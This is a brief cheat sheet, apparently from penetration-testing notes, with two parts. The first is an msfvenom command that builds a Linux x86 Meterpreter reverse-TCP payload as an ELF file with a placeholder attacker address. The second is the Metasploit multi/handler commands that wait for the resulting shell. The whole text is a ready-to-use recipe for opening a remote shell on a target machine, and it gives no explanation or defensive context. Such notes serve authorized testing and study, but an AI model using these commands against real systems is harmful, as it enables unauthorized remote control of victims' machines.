## Msfvenom Basic Payload

msfvenom -p linux/x86/meterpreter/reverse_tcp 
LHOST=YOUR_IP LPORT=4444 -f elf > shell.elf

## Handler Setup
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
